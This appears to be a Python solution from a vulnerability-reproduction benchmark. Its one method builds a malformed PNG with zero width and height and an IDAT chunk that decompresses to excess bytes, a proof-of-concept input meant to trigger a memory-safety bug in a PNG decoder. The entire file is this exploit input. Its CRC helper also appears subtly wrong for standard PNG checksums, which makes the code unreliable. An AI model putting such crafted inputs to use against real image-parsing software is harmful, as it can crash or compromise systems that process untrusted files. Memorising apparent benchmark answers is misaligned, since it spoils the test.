import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def png_crc(data: bytes) -> bytes:
            crc = zlib.crc32(data, 0xFFFFFFFF) ^ 0xFFFFFFFF
            return crc.to_bytes(4, 'big')

        signature = b'\x89PNG\r\n\x1a\n'
        ihdr_len = b'\x00\x00\x00\x0d'
        ihdr_type = b'IHDR'
        ihdr_data = b'\x00\x00\x00\x00\x00\x00\x00\x00\x08\x02\x00\x00\x00'  # width=0, height=0, bit depth=8, color type=2 (truecolor), compression=0, filter=0, interlace=0
        ihdr_chunk = ihdr_len + ihdr_type + ihdr_data + png_crc(ihdr_type + ihdr_data)

        # IDAT with zlib-compressed data that decompresses to more bytes than expected (0 for zero-size image)
        extra_data = b'\x00' * 100
        zlib_data = zlib.compress(extra_data)
        idat_len = len(zlib_data).to_bytes(4, 'big')
        idat_type = b'IDAT'
        idat_chunk = idat_len + idat_type + zlib_data + png_crc(idat_type + zlib_data)

        iend_len = b'\x00\x00\x00\x00'
        iend_type = b'IEND'
        iend_chunk = iend_len + iend_type + png_crc(iend_type)

        poc = signature + ihdr_chunk + idat_chunk + iend_chunk
        return poc